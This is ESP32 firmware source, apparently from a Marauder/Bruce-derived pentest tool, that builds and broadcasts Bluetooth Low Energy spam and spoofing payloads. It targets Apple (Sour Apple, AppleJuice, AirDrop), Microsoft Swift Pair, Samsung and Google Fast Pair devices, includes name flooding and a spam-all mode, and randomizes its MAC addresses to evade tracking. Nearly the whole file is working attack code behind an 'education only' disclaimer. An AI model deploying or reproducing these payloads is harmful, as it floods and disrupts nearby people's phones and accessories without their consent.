#include "bleheader.h"

/*
    * ble.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

NimBLEAdvertising *pAdvertising;
NimBLEServer *pServer;
NimBLEScan *pBLEScan;


LinkedList<BLEScanResult>* blescanres;
bool bleScanRedraw = false;
bool bleAnalyzerMode = false;
bool samsungbuds = false;
uint8_t spooferDeviceIndex = -1;
uint8_t spooferAppleDeviceColor = -1;
uint8_t spooferConnectableModeIndex = -1;
uint8_t spooferDiscoverableModeIndex = -1;

BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
{
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;
    //uint8_t dataSize = 0;

    switch (type)
    {
        //ESP32 Sour Apple by RapierXbox
        //Exploit by ECTO-1A
        case SourApple: {
            AdvData_Raw = new uint8_t[17];
            AdvData_Raw[i++] = 17 - 1;                     // Packet Length
            AdvData_Raw[i++] = 0xFF;                       // Packet Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x4C;                       // Packet Company ID (Apple, Inc.)
            AdvData_Raw[i++] = 0x00;                       // ...
            AdvData_Raw[i++] = 0x0F;                       // Type
            AdvData_Raw[i++] = 0x05;                       // Length
            uint8_t action = na_actions[random(GET_SIZE(na_actions))].value;
            uint8_t flags = 0xC0;
            if(action == 0x20 && rand() % 2) flags--;      // More spam for 'Join This AppleTV?'
            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
            AdvData_Raw[i++] = flags;                      // Action Flags
            AdvData_Raw[i++] = action;                     // Action Type
            esp_fill_random(&AdvData_Raw[i], 3);           // Authentication Tag
            i += 3;   
            AdvData_Raw[i++] = 0x00;                       // Additional Action Data Terminator ???
            AdvData_Raw[i++] = 0x00;                       // ???
            AdvData_Raw[i++] =  0x10;                      // Type ??? + Shenanigans ???
            esp_fill_random(&AdvData_Raw[i], 3);
            AdvData.addData(AdvData_Raw, 17);
            break;
        }

        case AppleJuice: {  //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
            int randdevice = random(2);
            if (randdevice == 0) {
                AdvData_Raw = new uint8_t[31];
                AdvData_Raw[i++] = 31 - 1; // Size
                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
                AdvData_Raw[i++] = 0x00; // ...
                AdvData_Raw[i++] = 0x07; // Continuity Type
                AdvData_Raw[i++] = 0x19; // Continuity Size
                uint8_t model_index = random(GET_SIZE(pp_models));
                uint16_t model = pp_models[model_index].value;
                uint8_t color = pp_models[model_index].colors[random(pp_models[model_index].colors_count)].value;
                uint8_t prefix;
                if(model == 0x0055 || model == 0x0030) prefix = 0x05;
                else {
                    if (espatsettings.useAppleJuicePaired) {
                        prefix = 0x01;
                    } else {
                        prefix = 0x07;
                    }
                }
                AdvData_Raw[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // Device Model
                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
                AdvData_Raw[i++] = 0x55; // Status
                AdvData_Raw[i++] = (random(10) << 4) + random(10); // Buds Battery Level
                AdvData_Raw[i++] = (random(8) << 4) + random(10); // Charing Status and Battery Case Level
                AdvData_Raw[i++] = random(256); // Lid Open Counter
                AdvData_Raw[i++] = color; // Device Color
                AdvData_Raw[i++] = 0x00;
                esp_fill_random(&AdvData_Raw[i], 16);
                i += 16;
                AdvData.addData(AdvData_Raw, 31);
            } else if (randdevice == 1) {
                AdvData_Raw = new uint8_t[11];
                AdvData_Raw[i++] = 11 - 1;
                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
                AdvData_Raw[i++] = 0x00; // ...
                AdvData_Raw[i++] = 0x0F; // Continuity Type
                AdvData_Raw[i++] = 0x05; // Continuity Size
                uint8_t flags = 0xC0;
                uint8_t action = na_actions[random(GET_SIZE(na_actions))].value;
                if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
                if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
                AdvData_Raw[i++] = flags;
                AdvData_Raw[i++] = action;
                esp_fill_random(&AdvData_Raw[i], 3);
                i += 3;
                AdvData.addData(AdvData_Raw, 11);
            }
            break;
        }
        case AppleAirDrop: { //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
            AdvData_Raw = new uint8_t[24];
            AdvData_Raw[i++] = 24 - 1;
            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x05;  // AirDrop Conntinuity Type
            AdvData_Raw[i++] = 0x12; // Size
            AdvData_Raw[i++] = 0x00; // Zeros
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x01; // Version
            AdvData_Raw[i++] = random(256); // AppleID
            AdvData_Raw[i++] = random(256); // ...
            AdvData_Raw[i++] = random(256); // Phone Number
            AdvData_Raw[i++] = random(256); // ...
            AdvData_Raw[i++] = random(256); // Email
            AdvData_Raw[i++] = random(256); // ...
            AdvData_Raw[i++] = random(256); // Email2
            AdvData_Raw[i++] = random(256); // ...
            AdvData_Raw[i++] = 0x00; // Zero
            
            AdvData.addData(AdvData_Raw, 24);
            break;
        }
        case Microsoft: {
            String Name = generateRandomName();

            uint8_t name_len = Name.length();

            AdvData_Raw = new uint8_t[7 + name_len];

            AdvData_Raw[i++] = 7 + name_len - 1;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
            i += name_len;
            AdvData.addData(AdvData_Raw, 7 + name_len);
            break;
        }

        case Samsung: {
            if (random(2) == 0) {
                uint32_t model = watch_models[random(GET_SIZE(watch_models))].value;
                AdvData_Raw = new uint8_t[15];
                AdvData_Raw[i++] = 15 - 1; // Size
                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
                AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
                AdvData_Raw[i++] = 0x00; // ...
                AdvData_Raw[i++] = 0x01;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x02;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x01;
                AdvData_Raw[i++] = 0x01;
                AdvData_Raw[i++] = 0xFF;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x43;
                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
                AdvData.addData(AdvData_Raw, 15);
            } else { //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
                uint32_t model = buds_models[random(GET_SIZE(buds_models))].value;
                AdvData_Raw = new uint8_t[31];
                AdvData_Raw[i++] = 27; // Size
                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
                AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
                AdvData_Raw[i++] = 0x00; // ...
                AdvData_Raw[i++] = 0x42;
                AdvData_Raw[i++] = 0x09;
                AdvData_Raw[i++] = 0x81;
                AdvData_Raw[i++] = 0x02;
                AdvData_Raw[i++] = 0x14;
                AdvData_Raw[i++] = 0x15;
                AdvData_Raw[i++] = 0x03;
                AdvData_Raw[i++] = 0x21;
                AdvData_Raw[i++] = 0x01;
                AdvData_Raw[i++] = 0x09;
                AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Buds Model / Color (?)
                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
                AdvData_Raw[i++] = 0x01; // ... (Always static?)
                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
                AdvData_Raw[i++] = 0x06;
                AdvData_Raw[i++] = 0x3C;
                AdvData_Raw[i++] = 0x94;
                AdvData_Raw[i++] = 0x8E;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0x00;
                AdvData_Raw[i++] = 0xC7;
                AdvData_Raw[i++] = 0x00;

                AdvData_Raw[i++] = 16; // Size
                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
                AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
                AdvData.addData(AdvData_Raw, 31);
            }
            break;
        }

        case Google: {
            const uint32_t model = android_models[random(GET_SIZE(android_models))].value; // Action Type
            AdvData_Raw = new uint8_t[14];
            AdvData_Raw[i++] = 3; // Size
            AdvData_Raw[i++] = 0x03; // AD Type (Service UUID List)
            AdvData_Raw[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
            AdvData_Raw[i++] = 0xFE; // ...

            AdvData_Raw[i++] = 6; // Size
            AdvData_Raw[i++] = 0x16; // AD Type (Service Data)
            AdvData_Raw[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
            AdvData_Raw[i++] = 0xFE; // ...
            AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Device Model
            AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...

            AdvData_Raw[i++] = 2; // Size
            AdvData_Raw[i++] = 0x0A; // AD Type (Tx Power Level)
            AdvData_Raw[i++] = random(120) - 100; // -100 to +20 dBm

            AdvData.addData(AdvData_Raw, 14);
            break;
        }
        case NameFlood: {
            String Name;
            if (espatsettings.useBleNameasnameofNameFlood)
                Name = espatsettings.bleName;
            else Name = generateRandomName();
            uint8_t name_len = Name.length();

            AdvData_Raw = new uint8_t[12 + name_len];
            AdvData_Raw[i++] = 2; // Size
            AdvData_Raw[i++] = 0x01; // AD Type (Flags)
            AdvData_Raw[i++] = 0x06; // Flags

            AdvData_Raw[i++] = name_len + 1; // Size
            AdvData_Raw[i++] = 0x09; // AD Type (Complete Local Name)
            memcpy(&AdvData_Raw[i], Name.c_str(), name_len); // Device Name
            i += name_len;

            AdvData_Raw[i++] = 3; // Size
            AdvData_Raw[i++] = 0x02; // AD Type (Incomplete Service UUID List)
            AdvData_Raw[i++] = 0x12; // Service UUID (Human Interface Device)
            AdvData_Raw[i++] = 0x18; // ...

            AdvData_Raw[i++] = 2; // Size
            AdvData_Raw[i++] = 0x0A; // AD Type (Tx Power Level)
            AdvData_Raw[i++] = 0x00; // 0dBm

            AdvData.addData(AdvData_Raw, 12 + name_len);
            break;
        }
        default: {
            Serial.println("[WARN] Choose Company Type!");
            return AdvData; // Return empty data for default case
        }
    }

    // Clean up allocated memory
    delete[] AdvData_Raw;


    return AdvData;
    //// https://github.com/Spooks4576
}

void BLEModules::main()
{
    blescanres = new LinkedList<BLEScanResult>();
      
    // Initialize BLE
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    NimBLEDevice::setPower(MAX_TX_POWER);
    pBLEScan = NimBLEDevice::getScan();
    ble_initialized = true;
    Serial.println("[INFO] Successfully Initialized BLE Module");

    this->ShutdownBLE();
}

bool BLEModules::ShutdownBLE()
{
    if(ble_initialized) {
        if (pAdvertising->isAdvertising()) // This stupid things is cause continuous crash
            pAdvertising->stop();
        if (pBLEScan->isScanning()) {
            pBLEScan->stop();
            pBLEScan->clearResults();
        }
        // Deinitialize BLE
        vTaskDelay(10 / portTICK_PERIOD_MS); // need delay to prevent crash
        NimBLEDevice::deinit();
        ble_initialized = false;
        Serial.println("[INFO] Shutting down BLE Module Successfully");
        return true;
    }
    return false;
}

void BLEModules::StartMode(BLEScanState mode) {
    if (mode == BLE_SCAN_OFF) {
        if (ble_initialized) {
            this->ShutdownBLE();
        }
        if (bleAnalyzerMode) bleAnalyzerMode = false;
    } else if (mode == BLE_SCAN_DEVICE) {
        bleScan();
    } else if (mode == BLE_SCAN_ANALYZER) {
        bleAnalyzerMode = true;
        bleScan();
    } else if (mode == BLE_ATTACK_SPOOFER_APPLE)
        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
    else if (mode == BLE_ATTACK_SPOOFER_SAMSUNG)
        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
    else if (mode == BLE_ATTACK_EXPLOIT_SOUR_APPLE) 
        executeSwiftpair(SourApple);
    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_JUICE) 
        executeSwiftpair(AppleJuice);
    else if (mode == BLE_ATTACK_EXPLOIT_MICROSOFT)
        executeSwiftpair(Microsoft);
    else if (mode == BLE_ATTACK_EXPLOIT_SAMSUNG)
        executeSwiftpair(Samsung);
    else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE)
        executeSwiftpair(Google);
    else if (mode == BLE_ATTACK_EXPLOIT_NAME_FLOOD)
        executeSwiftpair(NameFlood);
    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_AIRDROP)
        executeSwiftpair(AppleAirDrop);
    else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
        executeSwiftpair(SourApple, true);
        executeSwiftpair(AppleJuice, true);
        executeSwiftpair(AppleAirDrop, true);
        executeSwiftpair(Microsoft, true);
        executeSwiftpair(Samsung, true);
        executeSwiftpair(Google, true);
        executeSwiftpair(NameFlood, true);
    }
    else if (mode == BLE_ATTACK_SPOOFER_INIT)
        initSpoofer();
    else if (mode == BLE_ATTACK_EXPLOIT_INIT)
        initSpam(); // Initialize BLE for exploit attacks
    else if (mode == BLE_ATTACK_SPOOFER_STOP)
        stopSpoofer();
    else {
        Serial.println("[ERROR] Invalid BLE Scan Mode Selected");
    }
}

BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
        Serial.println("[INFO] BLE Apple Spoofer Starting");
                uint8_t AdvData_Raw[31];
                int i = 0;
                AdvData_Raw[i++] = 31 - 1; // Size
                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
                AdvData_Raw[i++] = 0x00; // ...
                AdvData_Raw[i++] = 0x07; // Continuity Type
                AdvData_Raw[i++] = 0x19; // Continuity Size
                //uint8_t model_index = random(GET_SIZE(pp_models));
                uint16_t model = pp_models[(int)device_type].value;
                uint8_t color;
                if (espatsettings.useAppleJuicePaired)
                    color = pp_models[(int)device_type].colors[spooferAppleDeviceColor].value;
                else color = pp_models[(int)device_type].colors[random(pp_models[(int)device_type].colors_count)].value;
                uint8_t prefix;
                if(model == 0x0055 || model == 0x0030) prefix = 0x05;
                else {
                    if (espatsettings.useAppleJuicePaired) {
                        prefix = 0x01;
                        Serial.println("[INFO] Enable Colored Apple Device Spoofer");
                    }
                    else prefix = 0x07;
                }
                AdvData_Raw[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // Device Model
                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
                AdvData_Raw[i++] = 0x55; // Status
                AdvData_Raw[i++] = (random(10) << 4) + random(10); // Buds Battery Level
                AdvData_Raw[i++] = (random(8) << 4) + random(10); // Charing Status and Battery Case Level
                AdvData_Raw[i++] = random(256); // Lid Open Counter
                AdvData_Raw[i++] = color; // Device Color
                AdvData_Raw[i++] = 0x00;
                esp_fill_random(&AdvData_Raw[i], 16);
                i += 16;
                AdvData.addData(AdvData_Raw, 31);
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
        Serial.println("[INFO] BLE Samsung Spoofer Starting");
        if (samsungbuds) {
            uint32_t model = buds_models[(int)device_type].value;
            int i = 0;
            uint8_t AdvData_Raw[31];
            AdvData_Raw[i++] = 27; // Size
            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x42;
            AdvData_Raw[i++] = 0x09;
            AdvData_Raw[i++] = 0x81;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x14;
            AdvData_Raw[i++] = 0x15;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x21;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x09;
            AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Buds Model / Color (?)
            AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
            AdvData_Raw[i++] = 0x01; // ... (Always static?)
            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x3C;
            AdvData_Raw[i++] = 0x94;
            AdvData_Raw[i++] = 0x8E;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0xC7;
            AdvData_Raw[i++] = 0x00;

            AdvData_Raw[i++] = 16; // Size
            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
            AdvData.addData(AdvData_Raw, 31);
            Serial.println("[INFO] Enable Samsung Buds Spoofer");
        } else {
            uint32_t model = watch_models[(int)device_type].value;
            int i = 0;
            uint8_t AdvData_Raw[15];
            AdvData_Raw[i++] = 15 - 1; // Size
            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x43;
            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
            AdvData.addData(AdvData_Raw, 15);
        }
    }

    Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
    String conn_mode_str = "";
    String disc_mode_str = "";
    
    switch(conn_mode) {
        case CONN_MODE_NON:
            pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
            conn_mode_str = "NON";
            break;
        case CONN_MODE_DIR:
            pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_DIR);
            conn_mode_str = "DIR";
            break;
        case CONN_MODE_UND:
            pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
            conn_mode_str = "UND";
            break;
    }
    switch(disc_mode) {
        case DISC_MODE_NON:
            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_NON);
            disc_mode_str = "NON";
            break;
        case DISC_MODE_LTD:
            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_LTD);
            disc_mode_str = "LTD";
            break;
        case DISC_MODE_GEN:
            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
            disc_mode_str = "GEN";
            break;
    }

    Serial.println("[INFO] BLE Spoofer Connectable Mode: " + conn_mode_str);
    Serial.println("[INFO] BLE Spoofer Discoverable Mode: " + disc_mode_str);

    return AdvData;
}

void BLEModules::initSpoofer() {
    if (ble_initialized) {
        Serial.println("[INFO] BLE already initialized, skipping...");
        return;
    }
    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    esp_ble_gap_set_rand_addr(null_addr);

    Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
}

void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
    uint8_t dummy_addr[6] = {0x00};
    for (int i = 0; i < 6; i++) {
       dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    if (!ble_initialized) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);
        esp_ble_gap_set_rand_addr(dummy_addr);
        NimBLEDevice::init(espatsettings.bleName.c_str());
        NimBLEDevice::setPower(MAX_TX_POWER);
        NimBLEServer *pServer = NimBLEDevice::createServer();
        pAdvertising = pServer->getAdvertising();
        ble_initialized = true;
    }
    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, conn_mode, disc_mode);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->setMinInterval(0x20); // 32.5ms
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setPreferredParams(0x20, 0x20);
    pAdvertising->start();
    Serial.println("[INFO] Starting Spoofer Advertisement");
}

void BLEModules::stopSpoofer() {
    if (ble_initialized && pAdvertising->isAdvertising()) {
        vTaskDelay(50 / portTICK_PERIOD_MS); // Wait for advertisement to stop
        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS); // Wait for stop to complete
        BLEDevice::deinit();
        ble_initialized = false;
    }
    Serial.println("[INFO] Stopping Spoofer Advertisement");
}

void BLEModules::initSpam() {
    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    esp_ble_gap_set_rand_addr(null_addr);

    ble_initialized = true;
    Serial.println("[INFO] BLE Spam Initialized Successfully!");
}

void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
{
    uint8_t dummy_addr[6] = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    esp_ble_gap_set_rand_addr(dummy_addr);
    NimBLEDevice::init("");
    NimBLEDevice::setPower(MAX_TX_POWER, NimBLETxPowerType::Advertise);
    NimBLEServer *pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
    pAdvertising->setDiscoverableMode(random(3));
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setPreferredParams(0x20, 0x20);
    pAdvertising->start();
    if (!forspamall) {
        if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
        else if (type == SourApple || type == AppleAirDrop) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
        else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
    } else {
        vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
    }
    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    NimBLEDevice::deinit();
}

class BLEScanDeviceCallbacks: public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice *advertisedDevice) override {
        extern BLEModules ble;

        if (!bleAnalyzerMode) {
            bleScanRedraw = true;
            BLEScanResult bleres;
            String ble_name;
            ble_name = advertisedDevice->getName().c_str();
            if (ble_name.isEmpty()) bleres.name = "<no name>";
            else bleres.name = ble_name;
            bleres.rssi = advertisedDevice->getRSSI();
            bleres.addr = advertisedDevice->getAddress();
            if (!low_memory_warning)
                blescanres->add(bleres);
            String add_to_buffer;
            if (!low_memory_warning) {
                if (ble_name.isEmpty()) add_to_buffer = String(bleres.addr.toString().c_str());
                else add_to_buffer = ble_name;
            } else add_to_buffer = String("Low Mem! Ignore!");
            display_buffer->add(add_to_buffer);
            if (!low_memory_warning) Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
            else Serial.println("[INFO] Low Memory Warning! Ignore: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
        } else {
            for (int i = 0; i < 5; i++) ble.ble_analyzer_value++;

            if (ble.ble_analyzer_frames_recvd < 254) 
                ble.ble_analyzer_frames_recvd++;

            if (ble.ble_analyzer_frames_recvd >= 100) {
                ble.ble_analyzer_rssi = advertisedDevice->getRSSI();
                if (advertisedDevice->getName().length() != 0) {
                    ble.ble_analyzer_device = advertisedDevice->getName().c_str();
                } else {
                    ble.ble_analyzer_device = advertisedDevice->getAddress().toString().c_str();
                }
                ble.ble_analyzer_frames_recvd = 0;
            }
        }
        
    }
};

void BLEModules::bleScan() {
    delete blescanres;
    blescanres = new LinkedList<BLEScanResult>();
    NimBLEDevice::init(espatsettings.bleName.c_str());
    ble_initialized = true;
    pBLEScan = NimBLEDevice::getScan();
    if (!bleAnalyzerMode)
    pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), false);
    else
    pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), true);

    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    pBLEScan->setMaxResults(0);

    vTaskDelay(100 / portTICK_PERIOD_MS);

    Serial.println("[INFO] Starting BLE Scan");
    pBLEScan->start(0, false, true);
}

